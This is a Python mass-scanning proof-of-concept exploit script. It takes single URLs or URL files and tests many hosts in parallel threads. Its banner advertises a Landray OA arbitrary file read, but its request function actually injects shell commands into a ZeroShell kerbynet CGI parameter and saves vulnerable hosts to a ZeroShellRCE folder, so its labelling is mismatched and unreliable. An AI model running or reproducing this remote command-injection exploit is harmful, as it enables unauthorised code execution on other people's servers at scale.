#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author   : Cr4y0n
# @Software : PyCharm
# @Time     : 2021/05/22
# @Github   : https://github.com/Cr4y0nXX

import os
import time
import requests
from concurrent.futures import ThreadPoolExecutor, wait
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

vulnName = "LanDray_OA_ReadAnyFile"

def banner():
    logo = r"""
 _                     _                ______               _  ___             ______ _ _      
| |                   | |               | ___ \             | |/ _ \            |  ___(_) |     
| |     __ _ _ __   __| |_ __ __ _ _   _| |_/ /___  __ _  __| / /_\ \_ __  _   _| |_   _| | ___ 
| |    / _` | '_ \ / _` | '__/ _` | | | |    // _ \/ _` |/ _` |  _  | '_ \| | | |  _| | | |/ _ \
| |___| (_| | | | | (_| | | | (_| | |_| | |\ \  __/ (_| | (_| | | | | | | | |_| | |   | | |  __/
\_____/\__,_|_| |_|\__,_|_|  \__,_|\__, \_| \_\___|\__,_|\__,_\_| |_/_| |_|\__, \_|   |_|_|\___|  POC
                                    __/ |                                   __/ |               
                                   |___/                                   |___/       Author: Cr4y0n
    """
    msg = """
==================================================
| 漏洞名称 | 蓝凌OA系统存在任意文件读取漏洞
| 漏洞时间 | 2021-05-01
| 影响版本 | 当前全版本？
| 漏洞文件 | custom.jsp
| 默认路径 | /sys/ui/extend/varkind/custom.jsp
| FOFA语句 | app="Landray-OA系统"
==================================================
    """
    print("\033[91m" + logo + "\033[0m")
    print(msg)

# 创建参数
def parseArgs():
    date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
    parser = ArgumentParser(description="\033[31mNotice：You Must To Use One Of -u/-f\033[0m")
    parser.add_argument("-u", "--url", required=False, type=str, help=f"The target url")
    parser.add_argument("-f", "--file", required=False, type=str, metavar="URLFILE",help=f"The target url file")
    parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
    parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
    parser.add_argument("-o", "--output", required=False, type=str, metavar="FILENAME", default=date,  help="Vuln url output file, default is {date}.txt")
    return parser

# 初始化环境
def init(thread, timeout, file):
    print(f"\033[36m[*] Thread:  {thread}\033[0m")
    print(f"\033[36m[*] Timeout:  {timeout}\033[0m")
    msg = ""
    if os.path.isfile(file):
        msg += "\033[36m[*] Load url file successfully\033[0m\n"
    else:
        msg += f"\033[31m[-] Load url file {file} failed\033[0m\033[0m\n"
    print(msg)
    if "failed" in msg:
        print("\033[31[!] Init failed, Please check the environment.\033[0m\n")
        exit(0)

# 处理url格式
def parseURL(url):
    newURL = url
    if "https://" in newURL:
        newURL = newURL.replace("https://", "http://")
    if "http://" not in newURL:
        newURL = f"http://{newURL}"
    return newURL

# 加载url地址
def loadURL(args):
    urlList = []
    with open(args.file, encoding="utf8") as f:
        for line in f.readlines():
            line = parseURL(line.strip())
            urlList.append(line)
    return urlList

# 验证漏洞
def verify(url):
    repData = exploitVuln(url, "echo qazwsxedc")
    if "qazwsxedc" in repData:
        msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
        global findCount
        findCount += 1
        vulnRULList.append(url)
    elif "Conn" == repData:
        msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
    else:
        msg = f"[-] [ Safe ]  {url}"
    print(msg)

# 利用漏洞
def exploitVuln(url, cmd):
    global timeout
    reqURL = url + "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A$cmd$%0A%27".replace("$cmd$", cmd)
    print(reqURL)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        rep = requests.get(url=reqURL, headers=headers, timeout=timeout, verify=False)
        fileData = rep.text
        return fileData
    except:
        return "Conn"



# 输出结果
def outputResult(urlList, output, start):
    if not os.path.isdir(r"../output"):
        os.mkdir(r"../output")
    if not os.path.isdir(r"../output/vulScan"):
        os.mkdir(r"../output/vulScan")
    if not os.path.isdir(r"../output/vulScan/ZeroShellRCE"):
        os.mkdir(r"../output/vulScan/ZeroShellRCE")
    outputFile = f"../output/vulScan/ZeroShellRCE/{vulnName}_{output}.txt"
    with open(outputFile, "a") as f:
        for url in vulnRULList:
            f.write(url + "\n")
    try:
        print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(urlList), findCount))
        end = time.time()
        print("Time Spent: %.2f" % (end - start))
        print("-" * 20, f"\nThe vulnURL has been saved in \033[36m{outputFile}\033[0m\n")
    except:
        pass

def run():
    banner()
    pocArgs = parseArgs()
    args = pocArgs.parse_args()
    global timeout
    file, thread, timeout, output = args.file, args.thread, args.timeout, args.output
    if not args.file and not args.url:
        pocArgs.print_help()
    # 单个验证
    elif args.url:
        url = parseURL(args.url)
        verify(url)
    # 批量验证
    else:
        init(thread, timeout, file)
        urlList = loadURL(args)  # 所有目标
        start = time.time()
        executor = ThreadPoolExecutor(max_workers=args.thread)
        all = [executor.submit(verify, (url)) for url in urlList]
        wait(all)
        outputResult(urlList, output, start)

if __name__ == "__main__":
    findCount = 0
    vulnRULList = []
    run()
